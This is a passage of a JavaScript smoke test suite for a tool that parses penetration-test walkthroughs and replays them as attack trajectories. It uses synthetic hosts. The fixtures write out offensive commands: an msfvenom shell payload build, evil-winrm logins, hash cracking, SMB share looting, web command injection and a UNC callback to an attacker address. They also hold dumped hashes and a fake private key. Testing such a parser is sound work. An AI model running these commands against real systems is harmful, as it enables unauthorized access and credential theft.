#!/usr/bin/env node
/*
 * tests/engine/pg-practice-trajectories-smoke.js - Deterministic synthetic smoke suite
 * for PG-1 corpus extractor, stateful trajectory replay, Tier-1/2/3 parser grammars,
 * causal entailment guards, and outcome classification contracts.
 *
 * Contract:
 *   - 100% synthetic RFC 5737 / RFC 2606 / synthetic principal fixtures.
 *   - Zero machine names, walkthrough slugs, lab hostnames, author handles, or real hashes.
 *   - House style: zero em dashes, zero en dashes, zero emoji.
 */
'use strict';

const assert = require('assert');
const {
  createSandbox,
  createEngagementSession
} = require('../../tools/corpus/sandbox-loader');
const extractor = require('../../tools/corpus/markdown-extractor');
const trajectories = require('../../tools/corpus/harvest-trajectories');

function runSmokeSuite() {
  const OBOL = createSandbox();
  let passed = 0;
  const failures = [];

  function test(name, fn) {
    try {
      fn();
      passed++;
      console.log('  [PASS] ' + name);
    } catch (err) {
      failures.push({ name: name, error: err });
      console.error('  [FAIL] ' + name + ': ' + (err && err.message ? err.message : String(err)));
    }
  }

  function newSession(targetIp, lhostIp) {
    return createEngagementSession(OBOL, {
      name: 'SmokeSession',
      target: targetIp || '198.51.100.10',
      targets: [targetIp || '198.51.100.10'],
      lhost: lhostIp || '10.10.14.5'
    });
  }

  function hasKind(factsArr, kind) {
    return (factsArr || []).some(f => f && f.kind === kind);
  }

  function findFacts(factsArr, kind) {
    return (factsArr || []).filter(f => f && f.kind === kind);
  }

  console.log('Running PG-1 trajectories and generalization smoke suite...');

  // ---- Part I: Slice B4 Extractor and Trajectory Harness Generalizations ----

  test('B4-1: Adjacent Command + Output/Result fence pairing (including 1-line output and section-heading guard)', () => {
    const md = [
      '## Enumeration',
      '',
      'Command:',
      '```',
      'smbclient -L //198.51.100.10 -N',
      '```',
      'Output:',
      '```',
      'Anonymous login successful',
      '```',
      '',
      'Command:',
      '```',
      'nmap -p 80,445 -sV 198.51.100.10',
      '```',
      'Output (relevant):',
      '```',
      '80/tcp  open  http          Apache httpd 2.4.52',
      '445/tcp open  microsoft-ds',
      '```',
      '',
      '```bash',
      'python3 dump_tool.py -local',
      '```',
      '## Results',
      '```bash',
      'SUMMARY TABLE HEADER',
      '========================================',
      'acct_alpha : a1b2c3d4e5f60718293a4b5c6d7e8f90',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 4, 'Expected 2 paired turns plus 2 unpaired turns across ## Results');
    assert.strictEqual(res.turns[0].command, 'smbclient -L //198.51.100.10 -N');
    assert.strictEqual(res.turns[0].stdout.trim(), 'Anonymous login successful');
    assert.strictEqual(res.turns[1].command, 'nmap -p 80,445 -sV 198.51.100.10');
    assert.ok(/80\/tcp\s+open\s+http/.test(res.turns[1].stdout));
    assert.strictEqual(res.turns[2].command, 'python3 dump_tool.py -local');
    assert.strictEqual(res.turns[2].stdout.trim(), '');
  });

  test('B4-2: Multi-line RAW_ARTIFACT_HEADER_RE within first 5 lines when complete PEM envelope is present', () => {
    const pemFence = [
      'http://198.51.100.12:8080/api/keys/export',
      'Exported key payload:',
      '-----BEGIN OPENSSH PRIVATE KEY-----',
      'b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW',
      'QyNTUxOQAAACBsynthetic000000000000000000000000000000000000AAAAECsynt',
      '-----END OPENSSH PRIVATE KEY-----'
    ].join('\n');

    const cls = extractor.classifyFenceBlock('', pemFence);
    assert.strictEqual(cls.include, true, 'Expected bare fence with early PEM envelope to be included');
    const seg = extractor.segmentBlock({ text: pemFence, lang: '', lineStart: 10 });
    assert.strictEqual(seg.units.length, 1);
    assert.strictEqual(seg.units[0].command, '');
    assert.ok(/-----BEGIN OPENSSH PRIVATE KEY-----/.test(seg.units[0].stdout));
  });

  test('B4-3: Untagged bare multi-command fence splitting and pure interactive REPL input echo stripping', () => {
    const md = [
      '### Local Recon',
      '```',
      'whoami /priv',
      'whoami /groups',
      'systeminfo',
      '```',
      '',
      '```',
      'rpcclient -U "" -N 198.51.100.14',
      'enumdomusers',
      'enumdomgroups',
      '```',
      '',
      '```',
      'smbclient //198.51.100.14/SharedData -N',
      'recurse ON',
      'prompt OFF',
      'mget *',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 5);
    assert.deepStrictEqual(
      res.turns.slice(0, 3).map(t => [t.command, t.stdout]),
      [
        ['whoami /priv', ''],
        ['whoami /groups', ''],
        ['systeminfo', '']
      ]
    );
    assert.strictEqual(res.turns[3].command, 'rpcclient -U "" -N 198.51.100.14');
    assert.strictEqual(res.turns[3].stdout, '');
    assert.deepStrictEqual(res.turns[3].subcommands, ['enumdomusers', 'enumdomgroups']);
    assert.strictEqual(res.turns[4].command, 'smbclient //198.51.100.14/SharedData -N');
    assert.strictEqual(res.turns[4].stdout, '');
  });

  test('B4-4: Standalone Windows landing-prompt fence recognition after exploit/output captions', () => {
    const md = [
      '## Reverse Shell Callback',
      'Output:',
      '```',
      'PS C:\\Program Files\\AppSvc>',
      '```'
    ].join('\n');

    const res = extractor.extractWalkthroughTurns(md);
    assert.strictEqual(res.turns.length, 1);
    assert.strictEqual(res.turns[0].kind, 'powershell');
    assert.strictEqual(res.turns[0].hostHint, 'windows');
    assert.ok(/PS C:\\Program Files\\AppSvc>/.test(res.turns[0].promptLine));
  });

  test('B4-5: OCR sidecar prompt_line hostHint propagation and external browser reference housekeeping', () => {
    const entries = extractor.normalizeOcrSidecarEntries([
      {
        line: 30,
        prompt_line: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
        reconstructed_command: 'dir; type notes_export.txt',
        transcribed_output: '01000000d08c9ddf0115d1118c7a00c04fc297eb' + 'a0'.repeat(90)
      },
      {
        line: 45,
        kind: 'browser',
        reconstructed_command: 'GET https://stackoverflow.com/questions/100000/powershell-dpapi-example',
        transcribed_output: '$pw = ConvertTo-SecureString "TestPassword" -AsPlainText -Force'
      }
    ]);

    assert.strictEqual(entries[0].hostHint, 'remote-windows');
    assert.strictEqual(trajectories.isHousekeepingTurn(entries[0]).housekeeping, false);

    assert.strictEqual(entries[1].kind, 'browser');
    assert.strictEqual(entries[1].externalReference, true);
    const hk = trajectories.isHousekeepingTurn(entries[1]);
    assert.strictEqual(hk.housekeeping, true);
    assert.strictEqual(hk.reason, 'attacker_reference_lookup');
  });

  test('B4-6: inferEngagementNetworking ignores msfvenom bind_tcp LHOST and scanned target IPs for lhost', () => {
    const net = trajectories.inferEngagementNetworking([
      {
        command: 'nmap -sC -sV 10.200.55.40',
        stdout: 'Nmap scan report for 10.200.55.40\n80/tcp open http\n'
      },
      {
        command: 'msfvenom -p windows/shell_bind_tcp LHOST=10.200.55.40 LPORT=4444 -f exe -o stage_bin.exe',
        stdout: ''
      }
    ]);

    assert.strictEqual(net.primaryTarget, '10.200.55.40');
    assert.notStrictEqual(net.lhost, '10.200.55.40');
    assert.strictEqual(net.selfIps.indexOf('10.200.55.40'), -1);
  });

  test('B4-7: gateEvidencePresentInHistory strips # comments and pure REPL echoes before length check', () => {
    const commentHistory = [
      {
        command: 'hashcat -m 5600 captured.hash /usr/share/wordlists/rockyou.txt',
        stdout: '# Yields: acct_alpha:<redacted_secret_value>',
        housekeeping: false,
        minted_count: 0,
        outcome_kind: 'unknown'
      }
    ];
    const replHistory = [
      {
        command: 'rpcclient -U "" -N 198.51.100.20',
        stdout: 'enumdomusers\n\nenumdomgroups\nquerydispinfo',
        housekeeping: false,
        minted_count: 0,
        outcome_kind: 'unknown'
      }
    ];

    assert.strictEqual(trajectories.gateEvidencePresentInHistory(['credential.available'], commentHistory).found, false);
    assert.strictEqual(trajectories.gateEvidencePresentInHistory(['ad.users'], replHistory).found, false);
  });

  test('B4-8: Move matcher disambiguation, semantic variant guards, and obsoleted-move satisfaction', () => {
    const kerberoastCrack = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'hashcat -m 13100 svc_tgs.hash /usr/share/wordlists/rockyou.txt',
      stdout: ''
    });
    assert.ok(kerberoastCrack.length > 0);
    assert.strictEqual(kerberoastCrack[0].id, 'crack-kerberoast');

    const johnGeneric = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'john web_htpasswd.hash --wordlist=/usr/share/wordlists/rockyou.txt',
      stdout: ''
    });
    assert.ok(johnGeneric.some(c => c.id === 'crack-modular-hash'));
    const idxMod = johnGeneric.findIndex(c => c.id === 'crack-modular-hash');
    const idxKp = johnGeneric.findIndex(c => c.id === 'keepass-dump-recover');
    assert.ok(idxMod >= 0 && (idxKp < 0 || idxMod < idxKp));

    const winEnumUnprompted = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'whoami /priv',
      stdout: '',
      kind: 'unprompted',
      hostHint: ''
    });
    assert.ok(winEnumUnprompted.length > 0);
    assert.strictEqual(winEnumUnprompted[0].id, 'windows-enum');

    const actions = OBOL.packs.actions();
    const byId = Object.create(null);
    actions.forEach(a => { if (a && a.id) byId[a.id] = a; });

    if (byId['laps-read'] && byId['laps-read'].commands && byId['laps-read'].commands[0]) {
      for (const cObj of byId['laps-read'].commands) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['laps-read'], cObj, 'Get-ADComputer -Filter * | Select-Object Name,SID'),
          0
        );
      }
    }
    if (byId['manual-sqli-exploitation']) {
      for (const cObj of (byId['manual-sqli-exploitation'].commands || [])) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['manual-sqli-exploitation'], cObj, 'curl http://127.0.0.1/?C:\\Users\\acct_alpha\\Desktop\\stage_bin.exe'),
          0
        );
      }
    }
    if (byId['authz-abuse']) {
      for (const cObj of (byId['authz-abuse'].commands || [])) {
        assert.strictEqual(
          trajectories.scoreCommandAgainstVariant(byId['authz-abuse'], cObj, "curl -X POST -H 'content-length: 1000' http://198.51.100.15:33333/list-running-procs"),
          0
        );
      }
    }

    // Post-SYSTEM obsoleted windows-enum repeat check
    const sess = newSession('198.51.100.16');
    sess.ingestTurn({
      command: 'whoami',
      stdout: 'nt authority\\system\n',
      promptLine: 'C:\\Windows\\system32>whoami',
      target: '198.51.100.16',
      forceTarget: '198.51.100.16'
    });
    const sysFacts = sess.factSetForTarget('198.51.100.16');
    assert.ok(sysFacts.has('access.system'), 'Expected access.system before post-root systeminfo');
    const cands = trajectories.matchTurnToCatalogMoves(OBOL, {
      command: 'systeminfo',
      stdout: '',
      kind: 'cmd',
      hostHint: 'windows'
    }, { facts: sysFacts, target: '198.51.100.16' });
    const reach = trajectories.evaluateClosedLoopReachability(sess, cands, { command: 'systeminfo' }, {
      targetIp: '198.51.100.16',
      historyTurns: [],
      executedMoveIds: new Set()
    });
    assert.strictEqual(reach.reachable, true);
    assert.strictEqual(reach.mode, 'already_settled_repeat');
  });

  test('B4-9: End-to-end synthetic replayWalkthrough with Command/Output pairing, landing prompt, and OCR isolation', () => {
    const syntheticMd = [
      '# Synthetic Host Assessment',
      '',
      '## Port Scan',
      'Command:',
      '```',
      'nmap -p 80,445,5985 -sC -sV 198.51.100.70',
      '```',
      'Output:',
      '```',
      'Nmap scan report for 198.51.100.70',
      'PORT     STATE SERVICE       VERSION',
      '80/tcp   open  http          Apache httpd 2.4.52',
      '445/tcp  open  microsoft-ds  Microsoft Windows Server 2019 microsoft-ds',
      '5985/tcp open  wsman         Microsoft HTTPAPI httpd 2.0',
      '```',
      '',
      '## Shell Callback',
      'Output:',
      '```',
      'PS C:\\Program Files\\AppSvc>',
      '```',
      '',
      '## Local Enumeration',
      'Command:',
      '```',
      'whoami /priv',
      '```',
      'Output:',
      '```',
      'PRIVILEGES INFORMATION',
      '----------------------',
      'Privilege Name                Description                               State',
      '============================= ========================================= ========',
      'SeImpersonatePrivilege        Impersonate a client after authentication Enabled',
      '```'
    ].join('\n');

    const rep = trajectories.replayWalkthrough(OBOL, {
      slug: 'synthetic_win_chain',
      markdown: syntheticMd,
      ocrEntries: [
        {
          line: 25,
          kind: 'browser',
          reconstructed_command: 'GET https://github.com/example-org/doc-reference',
          transcribed_output: '$sample = ConvertTo-SecureString "TestPassword" -AsPlainText -Force'
        }
      ]
    }, {
      target: '198.51.100.70',
      lhost: '10.10.14.5'
    });

    assert.strictEqual(rep.totals.stalled_steps, 0, 'Expected 0 stalled steps on synthetic end-to-end replay');
    assert.ok(rep.totals.reachable_steps >= 2, 'Expected nmap and windows-enum steps to be reachable');
    const browserStep = rep.steps.find(s => s.housekeeping_reason === 'attacker_reference_lookup');
    assert.ok(browserStep, 'Expected external browser OCR entry to be classified as attacker_reference_lookup');
    assert.strictEqual(browserStep.minted_kinds.length, 0, 'External browser reference turn must not mint target facts');
  });

  // ---- Part II: PG-1 Engine, Tier-1/2/3 Parser, and Outcome Generalizations ----

  test('PG1-1: Empty-stdout OBOL.ingest.run preserves promptLine and followPrompt shell telemetry', () => {
    const sess1 = newSession('198.51.100.21');
    const r1 = sess1.ingestTurn({
      command: 'ssh -i id_rsa acct_alpha@198.51.100.21',
      stdout: '',
      followPrompt: 'C:\\Users\\acct_alpha\\Desktop>',
      target: '198.51.100.21',
      forceTarget: '198.51.100.21'
    });
    assert.ok(r1.ok !== false, 'Expected empty-stdout turn with followPrompt not to abort as empty');
    const f1 = sess1.factSetForTarget('198.51.100.21');
    assert.ok(f1.has('foothold.windows'), 'Expected foothold.windows from Windows landing followPrompt');

    const sess2 = newSession('198.51.100.22');
    sess2.ingestTurn({
      command: 'evil-winrm -i 198.51.100.22 -u acct_alpha -p SynthPass99!',
      stdout: '',
      followPrompt: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.22',
      forceTarget: '198.51.100.22'
    });
    const f2 = sess2.factSetForTarget('198.51.100.22');
    assert.ok(f2.has('foothold.windows'), 'Expected foothold.windows from Evil-WinRM landing prompt');
    assert.ok(f2.has('winrm.authenticated'), 'Expected winrm.authenticated from Evil-WinRM landing prompt');
  });

  test('PG1-2: Nmap verbose REASON column (syn-ack / ttl) stripping in service.version and exploit.versioned_banner', () => {
    const nmapOut = [
      'Nmap scan report for 198.51.100.23',
      'PORT     STATE SERVICE REASON          VERSION',
      '21/tcp   open  ftp     syn-ack         zFTPServer 6.0 build 2011-10-17',
      '22/tcp   open  ssh     syn-ack ttl 125 Bitvise WinSSHD 8.48',
      '242/tcp  open  http    syn-ack         Apache httpd 2.2.21 ((Win32) PHP/5.3.8)',
      '8080/tcp open  http    syn-ack         Apache Tomcat/Coyote JSP engine 1.1'
    ].join('\n');

    const sess = newSession('198.51.100.23');
    const rep = sess.ingestTurn({
      command: 'nmap -vv -sV 198.51.100.23',
      stdout: nmapOut,
      target: '198.51.100.23',
      forceTarget: '198.51.100.23'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'service.version'), 'Expected service.version on syn-ack HTTP rows');
    const banners = findFacts(minted, 'exploit.versioned_banner');
    assert.ok(banners.length > 0, 'Expected exploit.versioned_banner facts');
    const allEntries = [];
    for (const b of banners) {
      if (b.value && Array.isArray(b.value.all)) allEntries.push.apply(allEntries, b.value.all);
      else if (b.value) allEntries.push(b.value);
    }
    assert.ok(allEntries.length >= 2, 'Expected multiple versioned banner entries on syn-ack scan');
    for (const entry of allEntries) {
      const prod = String((entry && entry.product) || '');
      const sq = String((entry && entry.search_query) || '');
      assert.ok(!/\bsyn-ack\b/i.test(prod), 'Product must not include syn-ack prefix: ' + prod);
      assert.ok(!/\bsyn-ack\b/i.test(sq), 'search_query must not include syn-ack prefix: ' + sq);
    }
  });

  test('PG1-3: Nmap -sV inline Active Directory LDAP Domain banner extraction and NSE CVE promotion', () => {
    const nmapAdVuln = [
      'Nmap scan report for 198.51.100.24',
      'PORT    STATE SERVICE      VERSION',
      '88/tcp  open  kerberos-sec Microsoft Windows Kerberos',
      '389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: corp.example.internal0., Site: Default-First-Site-Name)',
      '445/tcp open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds',
      'Host script results:',
      '| smb-vuln-cve-2009-3103:',
      '|   VULNERABLE:',
      '|   SMBv2 Negotiation Vulnerability',
      '|     State: VULNERABLE',
      '|     IDs:  CVE:CVE-2009-3103',
      '|_    Disclosure date: 2009-09-07'
    ].join('\n');

    const sess = newSession('198.51.100.24');
    const rep = sess.ingestTurn({
      command: 'nmap -sV --script vuln 198.51.100.24',
      stdout: nmapAdVuln,
      target: '198.51.100.24',
      forceTarget: '198.51.100.24'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'ad.domain_known'), 'Expected ad.domain_known from inline LDAP Domain banner');
    assert.ok(hasKind(minted, 'host.domain'), 'Expected host.domain from inline LDAP Domain banner');
    const domFacts = findFacts(minted, 'host.domain');
    assert.ok(
      domFacts.some(f => String((f.value && (f.value.domain || f.value.name)) || '').toLowerCase() === 'corp.example.internal'),
      'Expected trailing 0. ASN.1 artifact stripped to corp.example.internal'
    );
    assert.ok(hasKind(minted, 'exploit.candidate'), 'Expected exploit.candidate from positive NSE State: VULNERABLE CVE');
  });

  test('PG1-4: edb.js web.server headers[] / |_http-server-header: and slash-qualified product version extraction', () => {
    const nmapHeaders = [
      'Nmap scan report for 198.51.100.25',
      'PORT     STATE SERVICE         VERSION',
      '143/tcp  open  imap            Mercury/32 imapd 4.62',
      '8081/tcp open  blackice-icecap',
      '|_http-server-header: Nexus/3.21.0-05 (OSS)'
    ].join('\n');

    const sess = newSession('198.51.100.25');
    const rep = sess.ingestTurn({
      command: 'nmap -sC -sV 198.51.100.25',
      stdout: nmapHeaders,
      target: '198.51.100.25',
      forceTarget: '198.51.100.25'
    });
    const banners = findFacts(rep.minted_facts || [], 'exploit.versioned_banner');
    const bannerItems = [];
    for (const b of banners) {
      if (b.value && Array.isArray(b.value.all)) bannerItems.push.apply(bannerItems, b.value.all);
      else if (b.value) bannerItems.push(b.value);
    }
    assert.ok(
      bannerItems.some(item => /nexus/i.test(String((item && item.product) || '')) && /^3\.21/.test(String((item && item.version) || ''))),
      'Expected Nexus 3.21.0-05 exploit.versioned_banner from |_http-server-header:'
    );
    assert.ok(
      bannerItems.some(item => /mercury\/32/i.test(String((item && (item.product || item.search_query)) || '')) && /4\.62/.test(String((item && item.version) || ''))),
      'Expected Mercury/32 imapd 4.62 exploit.versioned_banner preserving slash-qualified product'
    );
  });

  test('PG1-5: pwdump NO PASSWORD* disabled LM column mints loot.sam, hash.ntlm, and credential.available (no loot.ntds)', () => {
    const pwdumpOut = [
      'Administrator:500:NO PASSWORD*********************:a9f01b2c3d4e5f60718293a4b5c6d7e8:::',
      'Guest:501:NO PASSWORD*********************:31d6cfe0d16ae931b73c59d7e0c089c0:::',
      'acct_alpha:1002:NO PASSWORD*********************:11223344556677889900aabbccddeeff:::'
    ].join('\n');

    const sess = newSession('198.51.100.26');
    const rep = sess.ingestTurn({
      command: '',
      stdout: pwdumpOut,
      target: '198.51.100.26',
      forceTarget: '198.51.100.26'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'loot.sam'), 'Expected loot.sam on local pwdump output');
    assert.ok(hasKind(minted, 'hash.ntlm'), 'Expected hash.ntlm on local pwdump output');
    assert.ok(hasKind(minted, 'credential.available'), 'Expected credential.available for non-empty NT hashes');
    assert.ok(!hasKind(minted, 'loot.ntds'), 'Must not mint loot.ntds on local SAM pwdump');
  });

  test('PG1-6: PowerUp Write-HijackDll / HijackablePath and Write-UserAddMSI stanzas', () => {
    const powerUpOut = [
      '[*] Checking %PATH% for potentially hijackable DLL locations...',
      '',
      'HijackablePath : C:\\Python27\\',
      'AbuseFunction  : Write-HijackDll -DllPath \'C:\\Python27\\wlbsctrl.dll\'',
      '',
      '[*] Checking for AlwaysInstallElevated registry key...',
      '',
      'AbuseFunction  : Write-UserAddMSI'
    ].join('\n');

    const sess = newSession('198.51.100.27');
    const rep = sess.ingestTurn({
      command: '',
      stdout: powerUpOut,
      target: '198.51.100.27',
      forceTarget: '198.51.100.27'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'privesc.dll_hijack_candidate'), 'Expected privesc.dll_hijack_candidate');
    assert.ok(hasKind(minted, 'privesc.always_install_elevated'), 'Expected privesc.always_install_elevated');
    assert.ok(hasKind(minted, 'privesc.leads'), 'Expected privesc.leads');
  });

  test('PG1-7: Windows DPAPI CRYPTOAPI_BLOB hex string mints privesc.stored_credentials and credential.candidate', () => {
    const dpapiHex = '01000000d08c9ddf0115d1118c7a00c04fc297eb01000000' + '4a7b2c9e'.repeat(28);
    const sess = newSession('198.51.100.28');
    const rep = sess.ingestTurn({
      command: 'type C:\\Users\\acct_alpha\\Documents\\cred_blob.txt',
      stdout: dpapiHex + '\n',
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.28',
      forceTarget: '198.51.100.28'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'privesc.stored_credentials'), 'Expected privesc.stored_credentials on DPAPI blob');
    assert.ok(hasKind(minted, 'credential.candidate'), 'Expected credential.candidate on DPAPI blob');
  });

  test('PG1-8: net user promotes access.admin for owned principal in *Administrators, never for unowned Administrator', () => {
    const sess = newSession('198.51.100.29');
    // Establish owned session as acct_alpha
    sess.ingestTurn({
      command: 'evil-winrm -i 198.51.100.29 -u acct_alpha -p SynthPass99!',
      stdout: '',
      followPrompt: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });

    // Inspecting unowned Administrator must NOT mint access.admin
    const unownedNetUser = [
      'User name                    Administrator',
      'Account active               Yes',
      'Local Group Memberships      *Administrators',
      'Global Group memberships     *Domain Admins',
      'The command completed successfully.'
    ].join('\n');
    sess.ingestTurn({
      command: 'net user Administrator',
      stdout: unownedNetUser,
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });
    assert.ok(
      !sess.factSetForTarget('198.51.100.29').has('access.admin'),
      'Must not mint access.admin when inspecting unowned Administrator account'
    );

    // Inspecting owned acct_alpha after local-admin group addition MUST mint access.admin
    const ownedNetUser = [
      'User name                    acct_alpha',
      'Account active               Yes',
      'Local Group Memberships      *Administrators       *Remote Management Use',
      'Global Group memberships     *Domain Users',
      'The command completed successfully.'
    ].join('\n');
    sess.ingestTurn({
      command: 'net user acct_alpha',
      stdout: ownedNetUser,
      promptLine: '*Evil-WinRM* PS C:\\Users\\acct_alpha\\Documents>',
      target: '198.51.100.29',
      forceTarget: '198.51.100.29'
    });
    assert.ok(
      sess.factSetForTarget('198.51.100.29').has('access.admin'),
      'Expected access.admin when owned principal acct_alpha has *Administrators membership'
    );
  });

  test('PG1-9: enum4linux-ng random-username blank-password guest session and smbclient putting file writable share', () => {
    const e4lOut = [
      ' =======================================',
      '|    Sessions on 198.51.100.30          |',
      ' =======================================',
      '[-] Could not establish null session: STATUS_ACCESS_DENIED',
      '[+] Server allows session using username \' rjzqwxkp \'.trim(), password \'\''
    ].join('\n').replace("' rjzqwxkp '.trim()", "'rjzqwxkp'");

    const sess = newSession('198.51.100.30');
    const rep1 = sess.ingestTurn({
      command: 'enum4linux-ng -A 198.51.100.30',
      stdout: e4lOut,
      target: '198.51.100.30',
      forceTarget: '198.51.100.30'
    });
    const m1 = rep1.minted_facts || [];
    assert.ok(hasKind(m1, 'smb.guest_session'), 'Expected smb.guest_session on random-user blank-password session');
    assert.ok(hasKind(m1, 'smb.reachable'), 'Expected smb.reachable');
    assert.ok(!hasKind(m1, 'smb.null_session'), 'Must not mint smb.null_session when null session was denied');
    assert.notStrictEqual(rep1.outcome && rep1.outcome.kind, 'authorization-denied');

    const smbPutOut = 'putting file stage_bin.exe as \\stage_bin.exe (1420.5 kb/s) (average 1420.5 kb/s)\n';
    const rep2 = sess.ingestTurn({
      command: 'smbclient //198.51.100.30/DropShare -U guest%',
      stdout: smbPutOut,
      target: '198.51.100.30',
      forceTarget: '198.51.100.30'
    });
    assert.ok(hasKind(rep2.minted_facts || [], 'smb.writable_share'), 'Expected smb.writable_share on smbclient putting file');
  });

  test('PG1-10: curl ftp:// Unix ls -l listing, unquoted YAML secret_key_base, and Ruby Gemfile manifest', () => {
    const sess = newSession('198.51.100.31');
    const ftpListOut = [
      '-r--r--r-- 1 ftp ftp    312 May 14 2023 Gemfile',
      'drwxr-xr-x 1 ftp ftp      0 May 14 2023 config',
      '-r--r--r-- 1 ftp ftp   1024 May 14 2023 app_notes.txt'
    ].join('\n');
    const rList = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/',
      stdout: ftpListOut,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rList.minted_facts || [], 'ftp.reachable'), 'Expected ftp.reachable from curl ftp:// listing');
    assert.ok(hasKind(rList.minted_facts || [], 'loot.files'), 'Expected loot.files from curl ftp:// Unix ls -l rows');

    const yamlSecrets = [
      'production:',
      '  secret_key_base: 9f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a09f8e7d6c5b4a39281706f5e4d3c2b1a0'
    ].join('\n');
    const rYaml = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/config/secrets.yml',
      stdout: yamlSecrets,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rYaml.minted_facts || [], 'web.source_disclosed'), 'Expected web.source_disclosed on unquoted secret_key_base');
    assert.ok(hasKind(rYaml.minted_facts || [], 'credential.candidate'), 'Expected credential.candidate on unquoted secret_key_base');

    const gemfileBody = [
      "source 'https://rubygems.org'",
      "gem 'rails', '~> 5.1.3'",
      "gem 'puma', '~> 3.7'"
    ].join('\n');
    const rGem = sess.ingestTurn({
      command: 'curl -s ftp://198.51.100.31:30021/Gemfile',
      stdout: gemfileBody,
      target: '198.51.100.31',
      forceTarget: '198.51.100.31'
    });
    assert.ok(hasKind(rGem.minted_facts || [], 'web.manifest_disclosed'), 'Expected web.manifest_disclosed on Ruby Gemfile');
  });

  test('PG1-11: Raw IMAP4rev1 greeting and tagged LOGIN transcript', () => {
    const imapTranscript = [
      '* OK corp.example.internal Mercury/32 v4.62 IMAP4rev1 server ready.',
      'a01 LOGIN acct_alpha SynthMailPass42!',
      'a01 OK LOGIN completed.'
    ].join('\n');

    const sess = newSession('198.51.100.32');
    const rep = sess.ingestTurn({
      command: 'nc -nv 198.51.100.32 143',
      stdout: imapTranscript,
      target: '198.51.100.32',
      forceTarget: '198.51.100.32'
    });
    const minted = rep.minted_facts || [];
    assert.ok(hasKind(minted, 'mail.reachable'), 'Expected mail.reachable on IMAP4rev1 greeting');
    assert.ok(hasKind(minted, 'service.imap.banner'), 'Expected service.imap.banner on IMAP4rev1 greeting');
    assert.ok(hasKind(minted, 'credential.validated'), 'Expected credential.validated on tagged a01 OK LOGIN');
  });

  test('PG1-12: Headerless web command injection (curl http://target/?whoami returning Windows identity)', () => {
    const sess = newSession('198.51.100.33');
    const rep = sess.ingestTurn({
      command: 'curl http://198.51.100.33/?whoami',
      stdout: '<pre>\nnt authority\\system\n</pre>\n',
      target: '198.51.100.33',
      forceTarget: '198.51.100.33'
    });
    assert.ok(hasKind(rep.minted_facts || [], 'web.cmdi_confirmed'), 'Expected web.cmdi_confirmed on headerless curl Windows whoami output');
  });

  test('PG1-13: Escaped local Windows drive path (c:\\\\...) and HTTP query-string UNC callback (?url=\\\\...) FP rejection', () => {
    const sess1 = newSession('198.51.100.34', '10.10.14.5');
    const htaccessBody = [
      'AuthName "Restricted Portal"',
      'AuthType Basic',
      'AuthUserFile c:\\\\wamp\\www\\.htpasswd',
      'require valid-user'
    ].join('\n');
    const r1 = sess1.ingestTurn({
      command: 'cat .htaccess',
      stdout: htaccessBody,
      target: '198.51.100.34',
      forceTarget: '198.51.100.34'
    });
    const f1 = sess1.factSetForTarget('198.51.100.34');
    assert.ok(!hasKind(r1.minted_facts || [], 'smb.shares') && !f1.has('smb.shares'), 'Escaped c:\\\\ path must not mint smb.shares');
    assert.ok(!f1.has('port:445') && !f1.has('smb.reachable'), 'Escaped c:\\\\ path must not entail port:445 or smb.reachable');

    const sess2 = newSession('198.51.100.35', '10.10.14.5');
    const r2 = sess2.ingestTurn({
      command: 'curl "http://198.51.100.35:8080/?url=\\\\10.10.14.5\\share"',
      stdout: 'http://198.51.100.35:8080/?url=\\\\10.10.14.5\\share\n',
      target: '198.51.100.35',
      forceTarget: '198.51.100.35'
    });
    const f2 = sess2.factSetForTarget('198.51.100.35');
    assert.ok(!hasKind(r2.minted_facts || [], 'smb.shares') && !f2.has('smb.shares'), 'Query-string attacker UNC must not mint target smb.shares');
    assert.ok(!f2.has('port:445') && !f2.has('smb.reachable'), 'Query-string attacker UNC must not entail target port:445 or smb.reachable');
  });

  test('PG1-14: Non-default FTP port (20001/tcp) causal entailment guard does not entail phantom port:21', () => {
    const nmapHighFtp = [
      'Nmap scan report for 198.51.100.36',
      'PORT      STATE SERVICE VERSION',
      '80/tcp    open  http    Apache httpd 2.4.52',
      '20001/tcp open  ftp     FileZilla ftpd 0.9.41 beta',
      '| ftp-anon: Anonymous FTP login allowed (FTP code 230)',
      '|_-rw-r--r-- 1 ftp ftp 128 Jan 10 2023 readme.txt'
    ].join('\n');

    const sess = newSession('198.51.100.36');
    sess.ingestTurn({
      command: 'nmap -p 80,20001 -sC -sV 198.51.100.36',
      stdout: nmapHighFtp,
      target: '198.51.100.36',
      forceTarget: '198.51.100.36'
    });
    const facts = sess.factSetForTarget('198.51.100.36');
